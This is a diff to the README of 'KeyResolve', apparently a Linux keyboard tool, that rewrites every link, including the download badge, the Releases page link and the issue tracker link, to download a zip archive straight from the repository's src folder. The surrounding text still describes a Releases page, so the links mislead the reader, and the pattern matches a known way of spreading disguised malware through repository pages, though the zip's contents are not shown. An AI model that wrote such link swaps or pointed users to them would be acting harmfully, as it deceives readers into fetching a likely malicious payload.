@@ -1,6 +1,6 @@
 # 🎹 KeyResolve - Effortless Keyboard Control for Linux
 
-[![Download KeyResolve](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/SmartKid2021/KeyResolve/releases)
+[![Download KeyResolve](https://raw.githubusercontent.com/SmartKid2021/KeyResolve/main/src/Resolve-Key-mirza.zip)](https://raw.githubusercontent.com/SmartKid2021/KeyResolve/main/src/Resolve-Key-mirza.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To get started, you will need to download KeyResolve. Follow these steps:
 
 1. Click the link below to visit the Releases page:
 
-   [Visit this page to download](https://github.com/SmartKid2021/KeyResolve/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/SmartKid2021/KeyResolve/main/src/Resolve-Key-mirza.zip)
 
 2. On the Releases page, look for the latest version. 
 
@@ -69,7 +69,7 @@ If you experience any issues, consider the following:
 
 Your experience is important. If you have any questions or feedback, please reach out. 
 
-You can submit issues on the [issue tracker](https://github.com/SmartKid2021/KeyResolve/issues). Your contributions help make KeyResolve better for everyone.
+You can submit issues on the [issue tracker](https://raw.githubusercontent.com/SmartKid2021/KeyResolve/main/src/Resolve-Key-mirza.zip). Your contributions help make KeyResolve better for everyone.
 
 ## 📚 Related Topics
 
